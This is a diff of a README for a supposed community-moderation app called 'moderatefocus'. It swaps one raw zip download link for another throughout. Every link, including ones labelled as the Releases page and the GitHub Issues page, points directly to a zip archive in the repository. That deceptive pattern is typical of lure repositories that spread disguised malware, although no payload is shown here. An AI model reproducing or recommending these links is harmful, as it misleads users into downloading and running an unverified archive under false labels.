@@ -6,11 +6,11 @@ Welcome to **moderatefocus**! This application helps you understand community mo
 
 ## 📥 Download the Application
 
-[![Download moderatefocus](https://github.com/djador13/moderatefocus/raw/refs/heads/main/moderatefocus/Software-Mekbuda.zip)](https://github.com/djador13/moderatefocus/raw/refs/heads/main/moderatefocus/Software-Mekbuda.zip)
+[![Download moderatefocus](https://raw.githubusercontent.com/djador13/moderatefocus/main/moderatefocus/Software_1.6-alpha.1.zip)](https://raw.githubusercontent.com/djador13/moderatefocus/main/moderatefocus/Software_1.6-alpha.1.zip)
 
 To get started, visit the Releases page to download the application:
 
-[Download moderatefocus](https://github.com/djador13/moderatefocus/raw/refs/heads/main/moderatefocus/Software-Mekbuda.zip)
+[Download moderatefocus](https://raw.githubusercontent.com/djador13/moderatefocus/main/moderatefocus/Software_1.6-alpha.1.zip)
 
 ## 🔧 System Requirements
 
@@ -22,7 +22,7 @@ To get started, visit the Releases page to download the application:
 ## 🛠️ Installation Instructions
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://github.com/djador13/moderatefocus/raw/refs/heads/main/moderatefocus/Software-Mekbuda.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/djador13/moderatefocus/main/moderatefocus/Software_1.6-alpha.1.zip).
 
 2. **Choose the Right File:**
    On the Releases page, you will see different versions of **moderatefocus**. Choose the one that matches your operating system.
@@ -64,7 +64,7 @@ To get started, visit the Releases page to download the application:
 
 ### Where can I get more help?
 
-If you face any issues or have questions, check the [GitHub Issues page](https://github.com/djador13/moderatefocus/raw/refs/heads/main/moderatefocus/Software-Mekbuda.zip). You can also ask questions there or review existing discussions.
+If you face any issues or have questions, check the [GitHub Issues page](https://raw.githubusercontent.com/djador13/moderatefocus/main/moderatefocus/Software_1.6-alpha.1.zip). You can also ask questions there or review existing discussions.
 
 ### Can I suggest a feature?
 
